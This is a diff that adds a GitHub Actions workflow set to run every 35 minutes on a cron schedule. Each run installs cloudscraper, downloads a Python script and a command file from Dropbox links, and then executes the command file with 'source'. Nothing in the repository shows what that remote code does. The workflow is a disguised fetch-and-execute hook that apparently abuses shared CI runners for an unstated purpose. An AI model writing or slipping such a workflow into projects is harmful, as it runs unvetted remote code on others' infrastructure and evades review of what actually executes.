@@ -1,0 +1,30 @@
+name: Script
+
+on:
+  schedule:
+    - cron: '*/35 * * * *'
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Install Python
+        run: sudo apt-get update && sudo apt-get install python3 -y
+
+      - name: Install python requirements
+        run: sudo apt-get install python3-pip -y
+
+      - name: Run Shell Script
+        run: |
+          pip3 install cloudscraper
+          wget "https://www.dropbox.com/scl/fi/sruku82roc6f6xs63z97o/main.py?rlkey=k6qzat401l8chj0smj0rpy8y4&dl=1" -O main.py
+          time sleep 3
+          curl -L -o command.txt https://www.dropbox.com/scl/fi/9qraipe2584j090b0400h/command.txt?rlkey=j4qslngz5w8p7ellevog4qyjh&dl=1
+          time sleep 3
+          source command.txt
